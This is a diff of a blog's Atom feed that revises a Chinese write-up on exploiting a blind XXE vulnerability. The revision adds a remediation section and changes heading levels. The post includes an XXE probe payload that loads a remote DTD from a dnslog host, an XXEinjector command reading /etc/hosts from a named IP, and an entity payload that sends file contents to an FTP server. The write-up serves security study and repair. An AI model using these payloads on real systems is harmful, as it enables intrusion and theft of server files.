@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-09-08T06:48:34.000Z</updated>
+  <updated>2016-09-08T07:12:55.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -19,12 +19,12 @@
     <link href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AAblind-XXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
     <id>http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/</id>
     <published>2016-09-08T02:22:01.000Z</published>
-    <updated>2016-09-08T06:48:34.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">XXE漏洞以及Blind XXE总结</a></p>
-<h1 id="漏洞探测">漏洞探测</h1><p>使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。<br><img src="/images/onexxe1.png" alt=""></p>
+    <updated>2016-09-08T07:12:55.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">XXE漏洞以及Blind XXE总结</a></p>
+<h2 id="漏洞探测">漏洞探测</h2><p>使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。<br><img src="/images/onexxe1.png" alt=""></p>
 <p>测试payload:</p>
 <pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://sss.5510eb.dnslog.info/file.dtd"&gt;%remote;]&gt;</span>
-</code></pre><h1 id="文件读取">文件读取</h1><p>使用参考资料中的一些payload，发现并没有复现成功。后来发现使用<a href="https://github.com/enjoiz/XXEinjector" target="_blank" rel="external">XXEinjector</a>可以非常方便的验证漏洞。</p>
+</code></pre><h2 id="文件读取">文件读取</h2><p>使用参考资料中的一些payload，发现并没有复现成功。后来发现使用<a href="https://github.com/enjoiz/XXEinjector" target="_blank" rel="external">XXEinjector</a>可以非常方便的验证漏洞。</p>
 <pre><code><span class="string">.</span><span class="comment">/XXEinjector</span><span class="string">.</span><span class="comment">rb</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">host=22</span><span class="string">.</span><span class="comment">28</span><span class="string">.</span><span class="comment">98</span><span class="string">.</span><span class="comment">149</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">file=/root/XXEinjector/test</span><span class="string">.</span><span class="comment">txt</span>  <span class="literal">-</span><span class="literal">-</span><span class="comment">path=/etc/hosts</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">verbose</span> 
 </code></pre><p>命令可以读取hosts文件。XXEinjector.rb会自动开启http服务提供恶意dtd和开启ftp服务接受传送回来的文件信息。</p>
 <p><img src="/images/onexxe3.png" alt=""></p>
@@ -36,10 +36,11 @@
 &lt;<span class="exclamation_mark">!</span><span class="variable">ENTITY</span> <span class="comment">% int "&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://xxxxxxx:21/%payl;'&gt;"&gt;</span>
 </code></pre><p>然后ftp就会接受到hosts文件数据。</p>
 <p>使用提取的payload用burp测试可以获取数据。<br><img src="/images/onexxe2.png" alt=""></p>
-<h1 id="备注">备注</h1><p>XXE作为一种攻击形式，在不同的环境中会有各种比较灵活的利用。<a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a>中提到的禁用外部实体的情况下，利用uri Invocation来实现SSRF攻击。目前这个点的分析比较少，如果可以实现http的ssrf其实也是可以做不少事情的。</p>
+<h2 id="修复方案">修复方案</h2><p>参考<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="external">XML_External<em>Entity</em>(XXE)_Prevention_Cheat_Sheet</a>_Prevention_Cheat_Sheet#XMLReader)，根据相应的库的方式禁用外部实体解析。</p>
+<h2 id="备注">备注</h2><p>XXE作为一种攻击形式，在不同的环境中会有各种比较灵活的利用。<a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a>中提到的禁用外部实体的情况下，利用uri Invocation来实现SSRF攻击。目前这个点的分析比较少，如果可以实现http的ssrf其实也是可以做不少事情的。</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="htt]]>
+    <![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="htt]]>
     </summary>
     
       <category term="XXE" scheme="http://xdxd.love/tags/XXE/"/>
